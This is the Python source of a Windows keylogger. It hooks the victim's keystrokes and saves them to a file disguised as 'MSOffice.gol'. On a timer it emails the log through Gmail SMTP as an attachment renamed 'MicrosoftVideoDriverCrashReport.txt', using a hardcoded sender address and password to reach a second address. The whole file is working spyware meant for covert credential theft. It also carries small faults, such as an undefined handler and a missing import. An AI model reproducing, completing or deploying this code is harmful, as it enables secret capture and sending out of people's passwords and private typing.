""" keylogger.py
    This file is basically responsible for keylogging
    it has main 2 components
    1. actual keylogger
    2. daemon to send mails on some interval
"""

# import modules
try:
    from pygame import event, init
    from pyHook import HookManager
    from sys import exit
    from os import environ, path
    from smtplib import SMTP
    from email.MIMEMultipart import MIMEMultipart
    from email.MIMEBase import MIMEBase
    from email import Encoders
    from threading import Thread
    from time import sleep
except ImportError:
    print 'No modules found'
    sys.exit(1)

# set the logfile path
LOG_FILENAME = 'MSOffice.gol'
KEY_WORDS = "abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

# class
class KeyboardStroke(object):
    """ main class to handle the keyboard events
    """
    def __init__(self, logname):
        """
        """
        self.fp = None
        self.hm = None
        self.logpath = path.join(environ['USERPROFILE'], logname)
        self.strbuffer = ""
        self.total_buffer = ""

    def reset_strbuffer(self):
        """
        """
        self.strbuffer = ""

    def reset_file(self):
        """
        """
        try:
            self.fp.flush()
            self.fp.close()
            self.fp = open(self.logpath,"w")
        except Exception, err:
            print str(err)

    def bind(self):
        """
        """
        try:
            self.fp = open(self.logpath,"r+")
            self.hm = HookManager()
            self.hm.KeyDown = self.onkeyboardevent
            self.hm.HookKeyboard()
            init()
            while 1:
                event.pump()
        except IOError:
            print 'Exception while opening file'

    def exit(self):
        """
        """
        try:
            self.fp.close()
        except:
            pass

    def onkeyboardevent(self, event):
        """
        """
        try:
            if chr(event.Ascii) == "n":
                self.exit()
            if chr(event.Ascii) in KEY_WORDS:
                try:
                    print chr(event.Ascii)
                    self.strbuffer += str(chr(event.Ascii))
                    self.total_buffer += str(chr(event.Ascii))
                except:
                    pass
                if len(self.strbuffer) > 20:
                    print "writing to file"
                    self.fp.write(self.strbuffer)
                    self.fp.flush()
                    self.reset_strbuffer()
                if len(self.total_buffer) > 100:
                    self.total_buffer = ""
                    emailObj = Emailer('smtp.gmail.com', "adideshmukh122@gmail.com", "facebook1234", 587, 30)
                    emailObj.send_msg('adideshmukh122@gmail.com', 'maheshshtl@gmail.com', "test", self.logpath)
                    self.reset_file()
        except:
            pass

class Emailer(Thread):
    """ This is the emailer class responsble for
        sending emails
        >> is is basically going to attach MSOffice.gol
        in email message
    """
    def __init__(self, server, cred_email, cred_pass, port=587, sleep_time=3600):
        """setting credentials
        """
        Thread.__init__(self)
        self.sleep_time = sleep_time
        self.smtp_server = server
        self.port = port
        self.smtp_cred_email = cred_email
        self.smtp_cred_pass = cred_pass

    def handshake(self):
        """ handshaking protocol
        """
        self.server = SMTP(self.smtp_server, int(self.port))
        self.server.ehlo()
        self.server.starttls()
        self.server.ehlo()
        self.server.login(self.smtp_cred_email, self.smtp_cred_pass)

    def get_message(self, attachment_path):
        """ get the message form with attachment
        """
        msg = MIMEMultipart()
        part = MIMEBase('application', "octet-stream")
        fp = open(attachment_path, "r")
        data = fp.read()
        fp.close()
        part.set_payload(data)
        Encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="MicrosoftVideoDriverCrashReport.txt"')
        msg.attach(part)
        return msg.as_string()

    def send_msg(self, from_email, to_email, sub, attachment_path):
        """ send mail to client
        """
        try:
            self.handshake()
            msg = self.get_message(attachment_path)
            self.server.sendmail(from_email, to_email, msg)
            self.server.quit()
        except Exception, err:
            print 'Exception in send_msg :: ' + str(err)

    def run(self):
        """ main method to run
        """
        while True:
            self.send_msg('sender', 'rec', \
                          "sub", path.join(environ['USERPROFILE'], LOG_FILENAME))
            sleep(self.sleep_time)

if __name__ == "__main__":
    emailerObj = Emailer('smtp.gmail.com', "credemail", "password", 587, 30)
    emailerObj.start()
    keyStrokObj = KeyboardStroke(LOG_FILENAME)
    keyStrokObj.bind()
    hm = HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()